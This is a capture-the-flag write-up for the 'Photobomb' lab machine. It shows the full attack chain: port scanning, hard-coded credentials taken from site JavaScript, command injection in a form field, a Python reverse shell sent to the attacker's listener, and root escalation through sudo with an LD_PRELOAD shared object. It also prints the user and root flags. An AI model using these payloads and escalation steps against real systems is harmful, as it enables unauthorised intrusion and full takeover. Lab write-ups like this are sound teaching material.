# Photobomb Machine

## Enumerate Ports and Services

`$ nmap -Pn 10.10.11.182`

Output:

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


Looks like HTTP is enabled, let's see what the headers look like:
`$ curl -I 10.10.11.182`

Output:
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 08 Dec 2022 12:55:14 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://photobomb.htb/


In `Location`, we see that `10.10.11.182` resolves to `https://photobomb.htb/`

We need to update our /etc/hosts with this info

```
127.0.0.1       localhost
127.0.1.1       alaric
10.10.11.182    photobomb.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

And then navigate in our browser to `photobomb.htb`

---

### Traversing the webpage

When viewing source, and checking out linked files, we find some goodies in `photobomb.js`:

```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

Basically, if it finds a cookie with the value `isPhotoBombTechSupport`, it'll pre-populate creds for us (which it seems are hard-coded).

So, we got some creds!
`http://pH0t0:b0Mb!@photobomb.htb/printer`

We are not able to SSH into the host using these creds, sadly.

Gobuster doesn't return anything juicy
`gobuster -u photobomb.htb -w /usr/share/wordlists/dirb/big.txt`


### Webpage interactions

If there isn't anything interesting left on the static side, let's look at the dynamic side.
- What interactions can we perform with the web app?

On `photobomb.htb/printer` we can do an HTTP request to pull an image

We can intercept the request and see it like so:
```
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 78
Cache-Control: max-age=0
Authorization: Basic cEgwdDA6YjBNYiE=
Upgrade-Insecure-Requests: 1
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

We have a payload of: 
`photo`
`filetype`
`dimensions`

Can we perform injection on one of the vars?
- We'll need to have the injection URL-encoded

---

Let's see if we can inject `curl+10.10.14.37`

This is the original data for the POST request:
`photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000`

First, we set up our `netcat listener`:
```
└─$ nc -lvnp 80  
listening on [any] 80 ...
```

Injected with the `curl` request, we submit:
`photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;curl+10.10.14.37&dimensions=3000x2000`

And on our listener, we get our response:
```
connect to [10.10.14.37] from (UNKNOWN) [10.10.11.182] 52558
GET / HTTP/1.1
Host: 10.10.14.37
User-Agent: curl/7.68.0
Accept: */*
```

Great! So our proof-of-concept works! 

Let's extend this with a reverse shell
```
python3 -c 'import sys,socket,os,pty; s=socket.socket(); s.connect(("10.10.14.37", 9001)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("sh")'
```

> we start a socket, connect to the remote host, duplicate the main file descriptors, spawn a shell

So we spin up a `netcat` instance:
```
└─$ nc -nvlp 9001
listening on [any] 9001 ...
```

This is the data injected with the reverse shell (url-encoded):
`photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg%3bexport+RHOST%3d"10.10.14.37"%3bexport+RPORT%3d9001%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'&dimensions=3000x2000`

And we get a shell!
```
connect to [10.10.14.37] from (UNKNOWN) [10.10.11.182] 40608
$
```

We run `cd` to go to the home directory, and then `ls` to view contents
```
$ cd
$ ls
exploit  find  hint.txt  linpeas.sh  photobomb  shell.c  shell.so  user.txt
$ cat user.txt
c9ce062d205e474d2a43207c2d0a8ca5
```

And now we have the user flag!

---

## Privilege Escalation

The first thing we always want to do once we've gotten a foothold with a user account is understand the scope of our permissions.

We do so by running:
`sudo -l`

The following is returned:
```
$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
$ 
```

We can see that our user can run `sudo` and keep environment variables

Looking at some of the files, we see a ref to `LD_PRELOAD` in `shell.c`:
```
$ cat shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/sh");
}
$ 
```

We also see a generated `shell.so` file
- We can reasonably infer that this `.so` file was generated from the `shell.c` file
    - This would have been done via:
        - `gcc -fPIC -shared -o shell.so shell.c -nostartfiles` 
        - We try `gcc` in the shell, and see it is not in PATH
        - So we can reasonably conclude that the `.so` file is the result of a prior `gcc` operation

We can see in `sudo -l` that the one file which we can run as `root` is `/opt/cleanup.sh`
- Typically, this escalation is leveraged like so:
    - `sudo LD_PRELOAD=<shared_object_file> <root_permission_file>`

So, we'll run something like
    - `sudo LD_PRELOAD=/home/wizard/shell.so /opt/cleanup.sh`

When we run the above, we get: 
```
$ sudo LD_PRELOAD=/home/wizard/shell.so /opt/cleanup.sh
sudo LD_PRELOAD=/home/wizard/shell.so /opt/cleanup.sh
# 
```

We look like we have root:
```
# cat /root/root.txt
cat /root/root.txt
8885e03e6df5a63e43888b28f7eddf97
#
```

And we now have the flag!
